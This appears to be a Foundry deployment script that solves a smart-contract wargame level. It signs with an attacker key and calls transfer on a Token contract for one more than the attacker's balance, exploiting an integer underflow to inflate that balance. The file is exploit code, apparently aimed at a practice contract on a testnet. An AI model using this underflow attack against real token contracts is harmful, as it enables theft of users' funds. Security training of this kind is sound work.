// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Token.sol";

// forge script script/TokenHack.s.sol:TokenHackScript --rpc-url GOERELI_RPC_URL --broadcast -vvvv
contract TokenHackScript is Script {
  function setUp() public {}

  function run() public {
    uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY");
    address attackerAddress = vm.envAddress("ATTACKER_ADDRESS");

    vm.startBroadcast(attackerPrivateKey);
    Token tokenContract = Token(address(0x6019cECEEb8D567b6aE25E4d5B742430dcd9F4Fe));

    tokenContract.balanceOf(attackerAddress);

    tokenContract.transfer(address(0xF393A9fc3D97724C9425646026e527281C6BFd96), tokenContract.balanceOf(attackerAddress) + 1);

    tokenContract.balanceOf(attackerAddress);
    vm.stopBroadcast();
  }
}